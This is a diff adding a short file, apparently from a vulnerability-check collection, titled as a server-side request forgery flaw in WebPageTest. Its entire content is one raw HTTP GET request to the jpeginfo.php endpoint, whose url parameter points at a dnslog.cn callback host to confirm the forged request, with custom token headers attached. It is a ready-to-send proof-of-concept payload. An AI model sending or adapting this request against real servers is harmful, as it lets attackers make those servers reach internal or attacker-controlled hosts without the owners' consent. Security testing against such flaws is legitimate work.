@@ -1,0 +1,9 @@
+# Web Page Test 服务器请求伪造漏洞
+# webpagetest存在SSRF漏洞
+GET /jpeginfo/jpeginfo.php?url=http://xxx.dnslog.cn&acid=80001705&bid=hd_tag_m8mv25gu HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25gu
+RM-PRO-Token: adc2949a41afa65f7696ffe1ce28ba20
+RM-PRO-Time: 1742808468145
+User-Agent: curl/7.83.1
+
